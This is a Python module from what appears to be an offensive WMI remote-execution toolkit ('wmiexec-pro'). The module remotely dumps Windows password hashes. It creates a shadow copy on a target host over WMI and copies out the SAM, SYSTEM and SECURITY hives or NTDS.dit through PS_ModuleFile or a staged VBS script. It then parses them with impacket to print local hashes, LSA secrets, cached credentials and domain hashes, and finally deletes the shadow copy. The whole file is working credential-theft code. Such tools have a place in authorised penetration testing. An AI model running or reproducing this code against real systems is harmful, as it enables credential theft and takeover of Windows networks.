import logging
import uuid
import base64
import time
import os

from lib.helpers import get_vbs
from lib.methods.executeScript import executeScript_Toolkit
from lib.methods.classMethodEx import class_MethodEx
from lib.module_base import ModuleBase

from binascii import hexlify
from impacket.dcerpc.v5.dtypes import NULL
from impacket.dcerpc.v5.rpcrt import RPC_C_AUTHN_LEVEL_PKT_PRIVACY
from impacket.examples.secretsdump import LocalOperations, SAMHashes, LSASecrets, NTDSHashes


class Hashdump(ModuleBase):
    name = "hashdump"
    description = "Dump password hashes from the target system."

    @staticmethod
    def register_parser(subparsers):
        p = subparsers.add_parser(Hashdump.name, help=Hashdump.description)
        p.add_argument("-dump", action="store", choices=["sss", "ntds"], default="sss",
                       help="Hash type to dump (sss for Security Account Manager, ntds for NTDS.dit)")
        p.add_argument("-method", action="store", choices=["native", "legacy"], default="native",
                       help="Extraction method: native (PS_ModuleFile, Win8+/2012+) or legacy (VBS+ADODB). Default: native with auto-fallback.")
        return p

    @staticmethod
    def run(iWbemLevel1Login, dcom, options, **kwargs):
        executer = Hashdump(iWbemLevel1Login, dumpType=options.dump, method=getattr(options, "method", "native"))
        executer.hashdump()

    def __init__(self, iWbemLevel1Login, dumpType, method="native"):
        self.iWbemLevel1Login = iWbemLevel1Login
        self.executer = executeScript_Toolkit(self.iWbemLevel1Login)
        self.hostname = self.iWbemLevel1Login._INTERFACE__target
        self.save_Path = os.path.join("save", self.hostname)
        self.timeout = 10
        self.logger = logging.getLogger("wmiexec-pro")
        self.logger_countdown = logging.getLogger("CountdownLogger")
        # Remaining time for shadow copy action
        self.remaining_Time_SS = 10
        self.ClassName_StoreOutput = "Win32_OSRecoveryConfigurationDataStorage"
        self.ShadowCopy_InstanceID = str(uuid.uuid4())
        self.iWbemServices_cimv2 = None
        self.iWbemServices_subscription = None
        self.dumpType = dumpType
        self.method = method
        self.creds_FilesInfo = {
            "sss": {
                "filename": ["sam", "system", "security"],
                "directory": "\\windows\\system32\\config\\"
            },
            "ntds": {
                "filename": ["ntds.dit", "system"],
                "directory": "\\Windows\\NTDS\\"
            }
        }[self.dumpType]

    def hashdump(self):
        if not os.path.exists(self.save_Path):
            os.makedirs(self.save_Path, exist_ok=True)

        self.logger.info("Starting hashdump...")

        # cimv2 is always needed for shadow copy create/cleanup
        self.iWbemServices_cimv2 = self.iWbemLevel1Login.NTLMLogin("//./root/Cimv2", NULL, NULL)
        self.iWbemLevel1Login.RemRelease()

        shadow_id, device_object = self._create_shadow_copy()
        if not shadow_id:
            return False

        download_ok = False
        if self.method == "native":
            download_ok = self._download_via_native(device_object)
            if not download_ok:
                self.logger.info("Native method failed, falling back to legacy.")

        if not download_ok:
            # Legacy path needs the storage class + subscription namespace
            class_Method = class_MethodEx(self.iWbemLevel1Login)
            self.iWbemServices_cimv2, self.iWbemServices_subscription = class_Method.check_ClassStatus(
                ClassName=self.ClassName_StoreOutput,
                iWbemServices_Cimv2=self.iWbemServices_cimv2,
                return_iWbemServices=True
            )
            # ADODB.Stream can't read "\\?\" directly, but kernel form "\??\" works.
            # I have been research this for a long time, "ADODB.Stream" can't read "\\?\"" directly
            # But thankfully, after reading the post: https://medium.com/@WaterBucket/understanding-path-resolution-in-windows-70054c446b3b
            # I have try "\??\", then boom!
            kernel_object = device_object.replace("\\\\?\\", "\\??\\")
            if self._extract_file(kernel_object) and self._retrieve_file():
                download_ok = True

        if download_ok:
            self._parse_hashes()

        self._cleanup_shadow_copy(shadow_id)

    def _create_shadow_copy(self):
        try:
            win32_shadowcopy, _ = self.iWbemServices_cimv2.GetObject("Win32_ShadowCopy")
            resp = win32_shadowcopy.Create("C:\\", "ClientAccessible")
        except Exception as e:
            self.logger.error(f"Shadow copy creation failed: {e}")
            return None, None
        else:
            if resp.ReturnValue == 0:
                shadow_id = resp.ShadowID
                self.logger.log(100, f"Shadow copy created: {shadow_id}")
                
                # Get device object path
                shadowcopy_instance, _ = self.iWbemServices_cimv2.GetObject(f'Win32_ShadowCopy.ID="{shadow_id}"')
                device_object = shadowcopy_instance.DeviceObject
                self.logger.log(100, f"Device object: {device_object}")
                
                return shadow_id, device_object
            else:
                self.logger.error(f"Failed to create shadow copy, error code: {resp.ReturnValue}")
                return None, None
    
    # From https://github.com/0xthirteen/WMI_Proc_Dump :)
    def _download_via_native(self, device_object):
        """Read SAM/SYSTEM/SECURITY (or NTDS files) directly from shadow copy via PS_ModuleFile.FileData.
        No VBS, no temp class — provider passes InstanceID to CreateFileW which natively
        accepts \\\\?\\GLOBALROOT\\Device\\... shadow copy paths."""
        PSV3_NAMESPACE = "//./root/Microsoft/Windows/Powershellv3"

        try:
            iWbemServices = self.iWbemLevel1Login.NTLMLogin(PSV3_NAMESPACE, NULL, NULL)
            iWbemServices.get_dce_rpc().set_auth_level(RPC_C_AUTHN_LEVEL_PKT_PRIVACY)
            self.iWbemLevel1Login.RemRelease()
        except Exception as e:
            if "WBEM_E_INVALID_NAMESPACE" in str(e):
                self.logger.error("PSv3 namespace not available (requires Win8+/Server2012+).")
                return False
            self.logger.error(f"Failed to bind PSv3 namespace: {e}")
            return False

        for filename in self.creds_FilesInfo["filename"]:
            # NTDS mode: SYSTEM hive lives in config\, not NTDS\
            if self.dumpType == "ntds" and filename.lower() == "system":
                rel_path = f"\\Windows\\System32\\config\\{filename}"
            else:
                rel_path = f"{self.creds_FilesInfo['directory']}{filename}"
            target_path = f"{device_object}{rel_path}"
            escaped = target_path.replace("\\", "\\\\")
            saved = os.path.join(self.save_Path, filename)
            try:
                self.logger.info(f"Downloading {filename} via PS_ModuleFile from shadow copy...")
                file_instance, _ = iWbemServices.GetObject(f'PS_ModuleFile.InstanceID="{escaped}"')
                props = file_instance.getProperties()
                file_data = props["FileData"]["value"]
            except Exception as e:
                self.logger.error(f"Failed to read {filename} via PS_ModuleFile: {e}")
                return False

            if not file_data:
                self.logger.error(f"FileData empty for {filename}")
                return False

            # First 4 bytes (BE) = file length, then content
            file_length = int.from_bytes(bytes(file_data[0:4])[::-1], byteorder='little', signed=False)
            file_bytes = bytes(file_data[4:file_length + 4])

            with open(saved, "wb") as f:
                f.write(file_bytes)
            self.logger.log(100, f"Save {filename} to {saved.upper()}, size: {file_length} bytes")

        return True

    def _extract_file(self, kernel_object):
        self.logger.info("Dumping secrets from from shadow copy...")

        vbs = get_vbs("RetrieveShadowCopy.vbs")
        vbs = vbs.replace("REPLACE_WITH_CLASSNAME", self.ClassName_StoreOutput)
        vbs = vbs.replace("RELEACE_WITH_UUID", self.ShadowCopy_InstanceID)
        vbs = vbs.replace("RELEACE_WITH_KERNELOBJECT", kernel_object)
        vbs = vbs.replace("RELEACE_WITH_PATH", self.creds_FilesInfo["directory"])
        vbs = vbs.replace("REPLACE_WITH_FILES", ', '.join(f'"{filename}"' for filename in self.creds_FilesInfo["filename"]))
        tag = self.executer.ExecuteScript(script_content=vbs, returnTag=True, BlockVerbose=True, iWbemServices=self.iWbemServices_subscription)

        for i in range(self.remaining_Time_SS, 0, -1):
            self.logger_countdown.info(f"Waiting {i}s for file extraction.\r")
            time.sleep(1)

        self.executer.remove_Event(tag, BlockVerbose=True)
        return True

    def _retrieve_file(self):
        for filename in self.creds_FilesInfo["filename"]:
            saved = os.path.join(self.save_Path, filename)
            try:
                self.logger.info(f"Downloading {filename}")
                obj, _ = self.iWbemServices_cimv2.GetObject(f'{self.ClassName_StoreOutput}.CreationClassName="{self.ShadowCopy_InstanceID}_{filename}"')
                record = dict(obj.getProperties())
                with open(saved, "wb") as f:
                    f.write(base64.b64decode(record["DebugOptions"]["value"]))
                del obj, record
            except Exception as e:
                self.logger.error(f"Error downloading {filename}: {e}")
                return False
            else:
                if os.path.exists(saved) and os.path.getsize(saved) > 0:
                    size = os.path.getsize(saved)
                    self.logger.log(100, f"Save {filename} to {saved.upper()}, size: {size} bytes")
                else:
                    self.logger.error(f"Failed to download {filename}")
                    return False
        return True

    def _parse_hashes(self):
        try:
            localOperations = LocalOperations(os.path.join(self.save_Path, "system"))
            bootKey = localOperations.getBootKey()
            self.logger.info(f"Boot key extracted successfully, bootkey: 0x{hexlify(bootKey).decode("ascii")}")
            
            if self.dumpType == "ntds":
                ntds_hashes = NTDSHashes(
                    os.path.join(self.save_Path, "ntds.dit"),
                    bootKey,
                    isRemote=False,
                    history=False,
                    noLMHash=localOperations.checkNoLMHashPolicy(),
                    remoteOps=None,
                    useVSSMethod=True,
                    justNTLM=True,
                    pwdLastSet=False,
                    resumeSession=None,
                    outputFileName=None,
                    justUser=None,
                    printUserStatus=True,
                    perSecretCallback=lambda secretType, secret: self.logger.log(100, secret),
                )
                ntds_hashes.dump()
                ntds_hashes.finish()
            else:
                # Get SAM hashes
                self.logger.info("Extracting password hashes from SAM...")
                sam_hashes = SAMHashes(os.path.join(self.save_Path, "sam"), bootKey, isRemote=False, printUserStatus=True, perSecretCallback=lambda secret: self.logger.log(100, secret))
                sam_hashes.dump()

                lsa_secrets = LSASecrets(os.path.join(self.save_Path, "security"), bootKey, isRemote=False, history=True, perSecretCallback=lambda secretType, secret: self.logger.log(100, secret))
                lsa_secrets.dumpCachedHashes()
                lsa_secrets.dumpSecrets()

                # Clean up
                sam_hashes.finish()
                lsa_secrets.finish()
            
        except Exception as e:
            self.logger.error(f"Failed to parse hashes with impacket: {e}")
    
    def _cleanup_shadow_copy(self, shadow_id):
        try:
            self.iWbemServices_cimv2.DeleteInstance(f'Win32_ShadowCopy.ID="{shadow_id}"')
            self.logger.log(100, f"Shadow copy {shadow_id} cleaned up successfully")
        except Exception as e:
            self.logger.error(f"Failed to cleanup shadow copy: {e}")